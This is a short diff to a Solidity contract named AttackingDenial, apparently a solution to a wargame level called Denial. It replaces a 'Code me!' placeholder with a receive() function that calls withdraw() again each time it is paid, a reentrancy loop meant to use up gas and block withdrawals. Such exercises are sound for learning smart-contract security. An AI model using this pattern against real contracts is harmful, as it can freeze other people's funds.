@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Denial.sol";
+import "hardhat/console.sol";
 
 contract AttackingDenial {
     address payable public contractAddress;
@@ -9,5 +10,7 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable{
+      Denial(contractAddress).withdraw();
+    }
 }
